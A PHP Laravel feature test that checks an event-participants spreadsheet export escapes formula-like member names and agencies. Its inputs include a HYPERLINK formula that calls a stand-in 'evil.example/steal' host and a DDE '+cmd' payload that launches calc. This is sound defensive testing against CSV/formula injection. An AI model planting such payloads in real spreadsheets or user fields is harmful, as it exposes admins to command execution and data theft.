<?php

namespace Tests\Feature;

use App\Exports\EventParticipantsExport;
use App\Models\DetailEvent;
use App\Models\Event;
use App\Models\Member;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class EventParticipantsExportTest extends TestCase
{
    use RefreshDatabase;

    private function makeDetail(string $name, string $agency): DetailEvent
    {
        $event = Event::factory()->create();
        $member = Member::create([
            'nip' => '199001012020121088',
            'name' => $name,
            'email' => 'formula-event@example.com',
            'agency' => $agency,
            'nomember' => '00088/01/ASPROSDMA',
            'password' => bcrypt('password'),
        ]);

        return DetailEvent::create([
            'event_id' => $event->id,
            'member_id' => $member->id,
            'title' => 'peserta',
            'status' => 'approved',
        ]);
    }

    /**
     * Member name/agency are self-registered and can contain anything, and
     * this export is where those values reach a spreadsheet an admin opens
     * - same exposure MidtransTransactionExport was already fixed for.
     */
    public function test_a_formula_like_name_is_neutralized_in_the_export()
    {
        $detail = $this->makeDetail(
            '=HYPERLINK("http://evil.example/steal","klik")',
            '+cmd|\'/c calc\'!A0'
        );

        $row = (new EventParticipantsExport(collect([$detail])))->map($detail);

        $this->assertStringStartsWith("'=", $row[1]);
        $this->assertStringStartsWith("'+", $row[3]);
    }

    public function test_an_ordinary_name_is_left_untouched()
    {
        $detail = $this->makeDetail('Budi Santoso', 'Kementerian Contoh');

        $row = (new EventParticipantsExport(collect([$detail])))->map($detail);

        $this->assertSame('Budi Santoso', $row[1]);
        $this->assertSame('Kementerian Contoh', $row[3]);
    }
}
